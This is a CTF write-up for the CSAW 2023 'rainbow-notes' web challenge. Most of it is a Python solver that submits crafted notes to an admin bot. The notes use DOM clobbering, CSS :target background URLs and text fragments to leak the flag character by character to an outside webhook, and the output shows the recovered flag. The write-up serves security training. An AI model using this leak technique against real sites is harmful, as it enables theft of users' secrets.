# rainbow_notes

- source code: [CSAW-CTF-2023-Quals/web/rainbow-notes](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/web/rainbow-notes)

## Attachments

```console
root@kali:~/ctf/CSAW-CTF-2023-Quals/web/rainbow-notes# tar ztf handout.tar.gz
chrome.json
docker-compose.yml
web/
web/index.html
bot/
bot/package.json
bot/yarn.lock
bot/Dockerfile
bot/bot.js
bot/app.js
```

## Setup

```bash
sed -i -e 's/{1,256}\$$/{1,256}$$/g' -e '/- SITE=/ s/-/# -/' docker-compose.yml
echo -ne 127.0.0.1 rainbow-notes.csaw.io rainbow-notes-bot.csaw.io | tee -a /etc/hosts
docker-compose up
```

## solver.py

```python
from http.server import BaseHTTPRequestHandler
from socketserver import TCPServer
import threading
import time

import requests

HOST = "0.0.0.0"
PORT = 80

WEBHOOK_URL = "<your webhook url, e.g. Ngrok or RequestBin>"
APP_BASE_URL = "http://localhost:8000"
APP_INTERNAL_BASE_URL = "http://web"

IS_EXFILTRATED = False


class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global IS_EXFILTRATED

        self.send_response(200)
        self.end_headers()

        IS_EXFILTRATED = True


def start_server():
    TCPServer.allow_reuse_address = True

    httpd = TCPServer((HOST, PORT), RequestHandler)
    thread = threading.Thread(target=httpd.serve_forever)
    thread.daemon = True
    thread.start()

    print(f"Listening {HOST}:{PORT}")


def send_request(flag):
    payload = f'{APP_INTERNAL_BASE_URL}/?note=<form id="f"><input name="insertBefore">X<style>:target{{background:url("{WEBHOOK_URL}/?flag={flag}")}}</style></form>#:~:text={flag}'
    data = {"url": payload}
    requests.post(f"{APP_BASE_URL}/submit", data=data)


def bruteforce():
    global IS_EXFILTRATED

    flag = "csawctf{"
    flag_length = 10
    possible = "0123456789abcdef"

    for _ in range(flag_length):
        for c in possible:
            print(flag + c, end="\r", flush=True)
            send_request(flag + c)

            time.sleep(10)

            if IS_EXFILTRATED:
                print()
                flag += c
                IS_EXFILTRATED = False
                break

    flag += "}"
    print(flag)


def main():
    start_server()
    bruteforce()


if __name__ == "__main__":
    main()
```

```console
root@kali:~/ctf/CSAW-CTF-2023-Quals/web/rainbow-notes# python3 solver.py
Listening 0.0.0.0:80
(snip)
127.0.0.1 - - [08/Nov/2023 11:08:23] "GET /?flag=csawctf%7B5af5c57dd6 HTTP/1.1" 200 -

csawctf{5af5c57dd6}
```
